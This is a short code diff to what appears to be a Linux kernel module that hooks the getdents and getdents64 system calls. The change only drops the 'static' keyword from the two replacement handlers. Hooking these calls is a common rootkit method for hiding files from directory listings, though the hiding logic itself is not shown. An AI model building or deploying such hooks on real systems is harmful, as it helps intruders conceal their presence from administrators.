@@ -17,7 +17,7 @@
 sysfun_t orig_getdents;
 sysfun_t orig_getdents64;
 
-static long new_getdents64(const struct pt_regs *pt_regs)
+long new_getdents64(const struct pt_regs *pt_regs)
 {
     struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;
     int ret = orig_getdents64(pt_regs), err;
@@ -56,7 +56,7 @@ out:
     return ret;
 }
 
-static long new_getdents(const struct pt_regs *pt_regs)
+long new_getdents(const struct pt_regs *pt_regs)
 {
     struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;
     int ret = orig_getdents(pt_regs), err;
